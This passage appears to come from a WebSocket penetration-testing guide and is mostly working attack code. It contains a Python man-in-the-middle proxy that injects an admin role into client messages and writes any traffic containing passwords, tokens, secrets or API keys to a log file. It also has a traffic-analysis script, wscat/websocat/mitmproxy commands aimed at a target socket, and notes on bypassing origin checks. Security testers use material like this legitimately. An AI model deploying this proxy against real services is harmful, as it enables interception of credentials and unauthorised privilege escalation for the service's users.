    def __init__(self, target_url, listen_host='127.0.0.1', listen_port=8765):
        self.target_url = target_url
        self.listen_host = listen_host
        self.listen_port = listen_port
    
    async def handle_client(self, client_ws, path):
        """Handle client connection and proxy to target"""
        
        print(f"[+] Client connected from {client_ws.remote_address}")
        
        # Connect to target server
        try:
            async with websockets.connect(self.target_url) as target_ws:
                print(f"[+] Connected to target: {self.target_url}")
                
                # Bidirectional proxy
                await asyncio.gather(
                    self.forward_client_to_target(client_ws, target_ws),
                    self.forward_target_to_client(target_ws, client_ws)
                )
                
        except Exception as e:
            print(f"[-] Error: {e}")
    
    async def forward_client_to_target(self, client_ws, target_ws):
        """Forward messages from client to target"""
        async for message in client_ws:
            print(f"[CLIENT â†’ TARGET] {message}")
            
            # Modify message if needed
            modified_message = self.modify_client_message(message)
            
            await target_ws.send(modified_message)
    
    async def forward_target_to_client(self, target_ws, client_ws):
        """Forward messages from target to client"""
        async for message in target_ws:
            print(f"[TARGET â†’ CLIENT] {message}")
            
            # Extract sensitive data
            self.extract_sensitive_data(message)
            
            # Modify message if needed
            modified_message = self.modify_server_message(message)
            
            await client_ws.send(modified_message)
    
    def modify_client_message(self, message):
        """Modify client messages"""
        try:
            data = json.loads(message)
            
            # Example: Inject admin role
            if 'user' in data:
                data['user']['admin'] = True
                print(f"[*] Modified client message: {data}")
                return json.dumps(data)
        except:
            pass
        
        return message
    
    def modify_server_message(self, message):
        """Modify server messages"""
        # Implement custom logic
        return message
    
    def extract_sensitive_data(self, message):
        """Extract and log sensitive data"""
        sensitive_patterns = ['password', 'token', 'secret', 'apikey', 'credential']
        
        for pattern in sensitive_patterns:
            if pattern.lower() in message.lower():
                print(f"[!] SENSITIVE DATA DETECTED: {message}")
                with open('sensitive_data.log', 'a') as f:
                    f.write(f"{message}\n")
    
    async def start(self):
        """Start the proxy server"""
        async with websockets.serve(self.handle_client, self.listen_host, self.listen_port):
            print(f"[+] Proxy listening on {self.listen_host}:{self.listen_port}")
            print(f"[+] Forwarding to {self.target_url}")
            await asyncio.Future()  # Run forever

if __name__ == "__main__":
    # Usage
    proxy = WebSocketProxy(
        target_url="ws://target.com/socket",
        listen_host="127.0.0.1",
        listen_port=8765
    )
    
    asyncio.run(proxy.start())
```

### Traffic Analysis and Pattern Recognition

**Automated Message Analysis Script:**

```python
#!/usr/bin/env python3
import re
import json
from collections import Counter

def analyze_websocket_log(log_file):
    """Analyze captured WebSocket traffic"""
    
    with open(log_file, 'r') as f:
        messages = f.readlines()
    
    print(f"[+] Total messages: {len(messages)}")
    
    # Identify message types
    message_types = []
    
    for msg in messages:
        try:
            data = json.loads(msg)
            
            # Extract type identifiers
            if 'type' in data:
                message_types.append(data['type'])
            elif 'action' in data:
                message_types.append(data['action'])
            elif 'method' in data:
                message_types.append(data['method'])
                
        except:
            continue
    
    # Count message type frequency
    type_counts = Counter(message_types)
    print(f"\n[+] Message type distribution:")
    for msg_type, count in type_counts.most_common():
        print(f"    {msg_type}: {count}")
    
    # Extract unique field names
    all_fields = set()
    for msg in messages:
        try:
            data = json.loads(msg)
            all_fields.update(extract_keys(data))
        except:
            pass
    
    print(f"\n[+] Unique field names: {sorted(all_fields)}")
    
    # Identify potential vulnerabilities
    vuln_indicators = ['eval', 'exec', 'sql', 'query', 'admin', 'debug', 'test']
    
    print(f"\n[+] Potential vulnerability indicators:")
    for msg in messages:
        for indicator in vuln_indicators:
            if indicator in msg.lower():
                print(f"    {indicator.upper()}: {msg.strip()[:100]}")
                break

def extract_keys(obj, parent=''):
    """Recursively extract all keys from nested JSON"""
    keys = set()
    
    if isinstance(obj, dict):
        for k, v in obj.items():
            key_path = f"{parent}.{k}" if parent else k
            keys.add(key_path)
            keys.update(extract_keys(v, key_path))
    elif isinstance(obj, list):
        for item in obj:
            keys.update(extract_keys(item, parent))
    
    return keys

# Usage
analyze_websocket_log('websocket_traffic.log')
```

### Key Tools Summary

**Essential WebSocket Tools:**

```bash
# wscat - Interactive WebSocket client
npm install -g wscat
wscat -c ws://target.com/socket

# websocat - Command-line WebSocket client
cargo install websocat
websocat ws://target.com/socket

# wsdump - WebSocket dump tool (from websocket-client package)
pip install websocket-client
wsdump ws://target.com/socket

# mitmproxy - Interactive HTTPS proxy
pip install mitmproxy
mitmproxy -s websocket_intercept.py
```

**Important Testing Considerations:**

[Inference] WebSocket implementations may differ significantly between frameworks (Socket.io, SockJS, native WebSocket). Testing approaches should adapt to the specific implementation.

[Inference] Origin validation bypasses may include null origin, arbitrary subdomains, or protocol confusion (ws:// vs wss://).